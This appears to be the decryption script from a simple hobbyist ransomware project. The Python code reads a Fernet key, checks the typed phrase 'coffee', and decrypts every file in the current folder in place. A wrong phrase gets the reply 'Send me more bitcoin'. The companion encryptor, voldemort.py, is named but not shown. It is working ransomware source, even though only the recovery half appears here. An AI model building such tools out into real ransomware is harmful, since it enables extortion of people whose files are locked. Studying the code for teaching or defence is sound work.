#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet          #Fernet is a symmetric encryption method to avoid manipulation/reading without the key

files = []      #creates a list called files

for file in  os.listdir():
        if file =="voldemort.py" or file == "thekey.key" or file=="decrypt.py": #prevents to add voldemort.py, thekey and decrypt.py to the list of encripted files 
                continue
        if os.path.isfile(file):        #it will only add files, not directories to the "files" list
                files.append(file)

print(files)

with open("thekey.key","rb") as key: #opens thekey.key as rb and set it as "key"
        secretkey = key.read()  #creates a variable secretkey and set it equal to the contents of key

secretphrase = "coffee" #it will be the code to run the script decrypt.py
user_phrase = input("Enter the secret phrase to devrypt your files\n")

if user_phrase == secretphrase: #if user_phrase = "coffee" then it will run the for loop and decrypt all the files
        for file in files:
                with open(file, "rb") as thefile:
                        contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents) #created a variable contents_decrypted,added secretkey, and decrypt
                with open(file , "wb") as thefile:
                        thefile.write(contents_decrypted) #change to contents_decrypted
                print("congrats, your files are decrypted. Enjoy your coffee")
else:
        print("Sorry, wrong secret phrase. Send me more bitcoin")